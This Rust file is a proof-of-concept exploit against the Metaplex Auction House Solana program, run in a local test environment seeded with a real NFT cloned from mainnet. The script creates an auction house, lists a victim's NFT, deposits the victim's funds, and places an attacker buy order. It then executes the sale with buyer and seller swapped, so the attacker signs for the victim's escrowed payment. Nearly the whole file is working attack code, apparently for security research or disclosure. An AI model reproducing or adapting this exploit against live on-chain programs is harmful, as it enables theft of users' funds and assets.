#![allow(unused_variables, unused_imports)]
use std::str::FromStr;

use anchor_lang::{ToAccountMetas, prelude::{Rent, AccountMeta}, InstructionData};
use poc_framework::{LocalEnvironment, keypair, Environment, PrintableTransaction, solana_sdk::signer::Signer, solana_client::rpc_client::RpcClient};
use solana_program::{pubkey::Pubkey, system_program, sysvar::SysvarId, instruction::Instruction, system_instruction};

const PREFIX: &str = "auction_house";
const FEE_PAYER: &str = "fee_payer";
const TREASURY: &str = "treasury";
const SIGNER: &str = "signer";

fn main() {
    // ensure contract is up to date
    if !std::process::Command::new("cargo")
        .args(["build-bpf", "--manifest-path", "auction-house/Cargo.toml"])
        .spawn()
        .expect("can spawn cargo build")
        .wait()
        .expect("wait for cargo build okay")
        .success() {
        panic!("contract build failed");
    }

    let ah_prog_pubkey = metaplex_auction_house::id();
    let authority = keypair(0);
    let bob = keypair(1);
    let attacker = keypair(2);

    let (ah_pubkey, ah_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        authority.pubkey().as_ref(),
        spl_token::native_mint::id().as_ref(),
    ], &ah_prog_pubkey);

    let (ah_fee_pubkey, ah_fee_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        ah_pubkey.as_ref(),
        FEE_PAYER.as_bytes(),
    ], &ah_prog_pubkey);

    let (ah_treasury_pubkey, ah_treasury_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        ah_pubkey.as_ref(),
        TREASURY.as_bytes(),
    ], &ah_prog_pubkey);

    let (prog_signer_pubkey, prog_signer_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        SIGNER.as_bytes(),
    ], &ah_prog_pubkey);

    let nft_mint = Pubkey::from_str("J8DozScYyLEKx6xmc8bXDe5DZ5q2wrx54eT1RT25WnTP").unwrap();
    let nft_metadata = Pubkey::find_program_address(
        &[
            metaplex_token_metadata::state::PREFIX.as_bytes(),
            metaplex_token_metadata::id().as_ref(),
            nft_mint.as_ref(),
        ],
        &metaplex_token_metadata::ID,
    ).0;
    let nft_bob_account = spl_associated_token_account::get_associated_token_address(&bob.pubkey(), &nft_mint);
    let nft_attacker_account = spl_associated_token_account::get_associated_token_address(&attacker.pubkey(), &nft_mint);
    let nft_creator = Pubkey::from_str("F5FKqzjucNDYymjHLxMR2uBT43QmaqBAMJwjwkvRRw4A").unwrap();

    let rpc = RpcClient::new("https://api.mainnet-beta.solana.com".to_string());
    let mut env = LocalEnvironment::builder()
        .add_program(ah_prog_pubkey, "target/deploy/metaplex_auction_house.so")
        .clone_account_from_cluster(nft_mint, &rpc)
        .clone_account_from_cluster(nft_metadata, &rpc)
        .add_associated_account_with_tokens(bob.pubkey(), nft_mint, 1)
        .add_associated_account_with_tokens(attacker.pubkey(), nft_mint, 0)
        .add_account_with_lamports(bob.pubkey(), system_program::id(), 10_000_000_000)
        .add_account_with_lamports(attacker.pubkey(), system_program::id(), 10_000_000_000)
        .build();

    let create_ah_ix = Instruction {
        program_id: ah_prog_pubkey,
        accounts: metaplex_auction_house::accounts::CreateAuctionHouse {
            treasury_mint: spl_token::native_mint::id(),
            payer: env.payer().pubkey(),
            authority: authority.pubkey(),
            fee_withdrawal_destination: authority.pubkey(),
            treasury_withdrawal_destination: authority.pubkey(),
            treasury_withdrawal_destination_owner: authority.pubkey(),
            auction_house: ah_pubkey,
            auction_house_fee_account: ah_fee_pubkey,
            auction_house_treasury: ah_treasury_pubkey,
            token_program: spl_token::id(),
            system_program: system_program::id(),
            ata_program: spl_associated_token_account::id(),
            rent: Rent::id(),
        }.to_account_metas(None),
        data: metaplex_auction_house::instruction::CreateAuctionHouse {
            bump: ah_bump,
            fee_payer_bump: ah_fee_bump,
            treasury_bump: ah_treasury_bump,
            seller_fee_basis_points: 0,
            requires_sign_off: false,
            can_change_sale_price: true,
        }.data()
    };
    env.execute_as_transaction(&[create_ah_ix], &[]).print_named("CREATE auction house");

    let (sell_ts_pubkey, sell_ts_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        bob.pubkey().as_ref(),
        ah_pubkey.as_ref(),
        spl_associated_token_account::get_associated_token_address(&bob.pubkey(), &nft_mint).as_ref(),
        spl_token::native_mint::ID.as_ref(),
        nft_mint.as_ref(),
        &8_000_000_000u64.to_le_bytes(),
        &1u64.to_le_bytes(),
    ], &ah_prog_pubkey);
    let (free_sell_ts_pubkey, free_sell_ts_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        bob.pubkey().as_ref(),
        ah_pubkey.as_ref(),
        spl_associated_token_account::get_associated_token_address(&bob.pubkey(), &nft_mint).as_ref(),
        spl_token::native_mint::ID.as_ref(),
        nft_mint.as_ref(),
        &0u64.to_le_bytes(),
        &1u64.to_le_bytes(),
    ], &ah_prog_pubkey);
    let mut sell_nft_ix = Instruction {
        program_id: ah_prog_pubkey,
        accounts: metaplex_auction_house::accounts::Sell {
            wallet: bob.pubkey(),
            token_account: nft_bob_account,
            metadata: nft_metadata,
            authority: authority.pubkey(),
            auction_house: ah_pubkey,
            auction_house_fee_account: ah_fee_pubkey,
            seller_trade_state: sell_ts_pubkey,
            free_seller_trade_state: free_sell_ts_pubkey,
            token_program: spl_token::id(),
            system_program: system_program::id(),
            program_as_signer: prog_signer_pubkey,
            rent: Rent::id(),
        }.to_account_metas(None),
        data: metaplex_auction_house::instruction::Sell {
            trade_state_bump: sell_ts_bump,
            _free_trade_state_bump: free_sell_ts_bump,
            _program_as_signer_bump: prog_signer_bump,
            buyer_price: 8_000_000_000,
            token_size: 1,
        }.data(),
    };
    sell_nft_ix.accounts.iter_mut().find(|acc| acc.pubkey == bob.pubkey()).expect("bob is passed").is_signer = true;
    sell_nft_ix.accounts.iter_mut().find(|acc| acc.pubkey == bob.pubkey()).expect("bob is passed").is_writable = true;
    sell_nft_ix.accounts.iter_mut().find(|acc| acc.pubkey == nft_bob_account).expect("bob is passed").is_writable = true;

    env.execute_as_transaction(&[sell_nft_ix], &[&bob]).print_named("SELL bob's nft");

    let (bob_escrow_pubkey, bob_escrow_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        ah_pubkey.as_ref(),
        bob.pubkey().as_ref(),
    ], &ah_prog_pubkey);
    let deposit_ix = Instruction {
        program_id: ah_prog_pubkey,
        accounts: metaplex_auction_house::accounts::Deposit {
            wallet: bob.pubkey(),
            payment_account: bob.pubkey(),
            transfer_authority: bob.pubkey(),
            escrow_payment_account: bob_escrow_pubkey,
            treasury_mint: spl_token::native_mint::id(),
            authority: authority.pubkey(),
            auction_house: ah_pubkey,
            auction_house_fee_account: ah_fee_pubkey,
            token_program: spl_token::id(),
            system_program: system_program::id(),
            rent: Rent::id(),
        }.to_account_metas(None),
        data: metaplex_auction_house::instruction::Deposit {
            escrow_payment_bump: bob_escrow_bump,
            amount: 8_000_000_000,
        }.data(),
    };
    env.execute_as_transaction(&[deposit_ix], &[&bob]).print_named("DEPOSIT bob");

    let (buy_ts_pubkey, buy_ts_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        attacker.pubkey().as_ref(),
        ah_pubkey.as_ref(),
        spl_associated_token_account::get_associated_token_address(&bob.pubkey(), &nft_mint).as_ref(),
        spl_token::native_mint::ID.as_ref(),
        nft_mint.as_ref(),
        &8_000_000_000u64.to_le_bytes(),
        &1u64.to_le_bytes(),
    ], &ah_prog_pubkey);
    let (free_buy_ts_pubkey, free_buy_ts_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        attacker.pubkey().as_ref(),
        ah_pubkey.as_ref(),
        spl_associated_token_account::get_associated_token_address(&bob.pubkey(), &nft_mint).as_ref(),
        spl_token::native_mint::ID.as_ref(),
        nft_mint.as_ref(),
        &0u64.to_le_bytes(),
        &1u64.to_le_bytes(),
    ], &ah_prog_pubkey);
    let (attacker_escrow_pubkey, attacker_escrow_bump) = Pubkey::find_program_address(&[
        PREFIX.as_bytes(),
        ah_pubkey.as_ref(),
        attacker.pubkey().as_ref(),
    ], &ah_prog_pubkey);
    let ix_buy = Instruction {
        program_id: ah_prog_pubkey,
        accounts: metaplex_auction_house::accounts::Buy {
            wallet: attacker.pubkey(),
            payment_account: attacker.pubkey(),
            transfer_authority: attacker.pubkey(),
            treasury_mint: spl_token::native_mint::id(),
            token_account: nft_bob_account,
            metadata: nft_metadata,
            escrow_payment_account: attacker_escrow_pubkey,
            authority: authority.pubkey(),
            auction_house: ah_pubkey,
            auction_house_fee_account: ah_fee_pubkey,
            buyer_trade_state: buy_ts_pubkey,
            token_program: spl_token::id(),
            system_program: system_program::id(),
            rent: Rent::id(),
        }.to_account_metas(None),
        data: metaplex_auction_house::instruction::Buy {
            trade_state_bump: buy_ts_bump,
            escrow_payment_bump: attacker_escrow_bump,
            buyer_price: 8_000_000_000,
            token_size: 1,
        }.data()
    };
    env.execute_as_transaction(&[ix_buy], &[&attacker]).print_named("BUY attacker");

    // execute the trade normally, but keep the trade states alive
    let mut ix_execute = Instruction {
        program_id: ah_prog_pubkey,
        accounts: metaplex_auction_house::accounts::ExecuteSale {
            buyer: bob.pubkey(),
            seller: attacker.pubkey(),
            token_account: nft_bob_account,
            token_mint: nft_mint,
            metadata: nft_metadata,
            treasury_mint: spl_token::native_mint::id(),
            escrow_payment_account: bob_escrow_pubkey,
            seller_payment_receipt_account: attacker.pubkey(),
            buyer_receipt_token_account: nft_bob_account,
            authority: authority.pubkey(),
            auction_house: ah_pubkey,
            auction_house_fee_account: ah_fee_pubkey,
            auction_house_treasury: ah_treasury_pubkey,
            buyer_trade_state: sell_ts_pubkey,
            seller_trade_state: buy_ts_pubkey,
            free_trade_state: free_buy_ts_pubkey,
            token_program: spl_token::id(),
            system_program: system_program::id(),
            ata_program: spl_associated_token_account::id(),
            program_as_signer: prog_signer_pubkey,
            rent: Rent::id(),
        }.to_account_metas(None),
        data: metaplex_auction_house::instruction::ExecuteSale {
            escrow_payment_bump: bob_escrow_bump,
            _free_trade_state_bump: free_buy_ts_bump,
            program_as_signer_bump: prog_signer_bump,
            buyer_price: 8_000_000_000,
            token_size: 1,
        }.data()
    };
    ix_execute.accounts.iter_mut().find(|acc| acc.pubkey == attacker.pubkey()).expect("attacker is passed").is_signer = true;
    ix_execute.accounts.extend([
        AccountMeta {
            pubkey: nft_creator,
            is_signer: false,
            is_writable: true,
        },
    ].into_iter());

    env.execute_as_transaction(&[
        ix_execute,
        /*// revive the trade states
        system_instruction::transfer(&env.payer().pubkey(), &free_sell_ts_pubkey, 1_000_000),
        system_instruction::transfer(&env.payer().pubkey(), &sell_ts_pubkey, 1_000_000),
        system_instruction::transfer(&env.payer().pubkey(), &buy_ts_pubkey, 1_000_000),*/
    ], &[&attacker]).print_named("EXECUTE sale in reverse");


    println!("{:?}", unsafe {
        std::mem::transmute::<_, anchor_lang::__private::ErrorCode> (0x12c)
    });
}
